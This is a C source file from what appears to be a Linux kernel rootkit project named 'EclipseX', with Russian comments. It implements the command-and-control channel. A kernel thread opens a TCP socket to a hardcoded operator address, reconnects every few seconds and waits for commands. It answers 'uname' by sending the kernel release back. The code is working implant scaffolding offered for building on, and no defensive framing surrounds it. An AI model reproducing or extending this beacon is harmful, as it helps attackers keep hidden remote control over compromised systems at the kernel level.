#define pr_fmt(fmt) "EclipseX c2: " fmt

#include <linux/utsname.h>
#include "conn_serv.h"

#include <linux/net.h>
#include <linux/inet.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/netlink.h>
#include <net/sock.h>


static void process_msg(char* msg);
static int send_data(const char *data, size_t len);
static bool recv_data(void);
static bool connect_to_server(void);

#define SERVER_IP   "192.168.157.164"  // IP сервера
#define SERVER_PORT 12345             // Порт сервера

static struct socket *sock = NULL;   // Сокет
bool is_sock_released = false; // Флаг, отслеживающий освобождение сокета
static char buffer_send[1024];
static char buffer_recv[1024];

static void process_msg(char* msg) {
    pr_info("recv: %s\n", msg);
    memset(buffer_send, 0, sizeof(buffer_send));

    if (strncmp(msg, "uname", 5) == 0) {
        struct new_utsname *uts = init_utsname();
        send_data(uts->release, strlen(uts->release) + 1);
    } else {
        snprintf(buffer_send, sizeof(buffer_send), "command not found");
        send_data(buffer_send, strlen(buffer_send) + 1);
    }
}

static int send_data(const char *data, size_t len) {
    struct kvec vec;
    struct msghdr msg;
    int ret;

    memset(&msg, 0, sizeof(msg));
    vec.iov_base = (void *)data;
    vec.iov_len = len;

    ret = kernel_sendmsg(sock, &msg, &vec, 1, len);
    if (ret < 0) {
        pr_info("Error sending data: %d\n", ret);
    }

    return ret;
}

/*
    false - сервер отключен 
    true - прием успешен
*/
static bool recv_data(void) {
    struct kvec vec;
    struct msghdr msg;
    int ret;

    memset(&msg, 0, sizeof(msg));
    memset(buffer_recv, 0, sizeof(buffer_recv));
    vec.iov_base = buffer_recv;
    vec.iov_len = sizeof(buffer_recv) - 1;

    ret = kernel_recvmsg(sock, &msg, &vec, 1, sizeof(buffer_recv) - 1, MSG_DONTWAIT);
    if (ret < 0) {
        // pr_info("Ошибка приема данных: %d\n", ret);
        return true;
    } else if (ret == 0) {
        // pr_info("ret = 0\n");
        return false;
    }

    process_msg(buffer_recv);

    // pr_info("Получено: %s\n", buffer);
    return true;
}

static bool connect_to_server(void) {
    struct sockaddr_in addr;
    int ret;

    // 1. Создаем сокет
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        pr_info("Socket creation error: %d\n", ret);
        return false;
    }

    // 2. Заполняем структуру адреса сервера
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);
    addr.sin_addr.s_addr = in_aton(SERVER_IP);

    // 3. Подключаемся к серверу
    ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
    if (ret < 0) {
        pr_info("Connection error: %d\n", ret);
        sock_release(sock);
        pr_info("Socket is closed\n");
        return false;
    }

    pr_info("Connected to %s:%d\n", SERVER_IP, SERVER_PORT);
    return true;
}

// отлавливать когда серв закрывает подключение
int c2_thread(void *arg) {
    bool is_conn = false;
    while (!kthread_should_stop()) {  // Пока не пришла команда остановки
        if (is_conn) {
            if (!recv_data()) {
                is_conn = false;
            }

        } else {
            is_conn = connect_to_server();
            is_sock_released = !is_conn;
        }

        msleep(3000);  // Спим 5 секунду
    }

    if (!is_sock_released && sock) {
        sock_release(sock);
        pr_info("Socket is closed\n");
    }

    pr_info("Thread is completed\n");
    return 0;
}
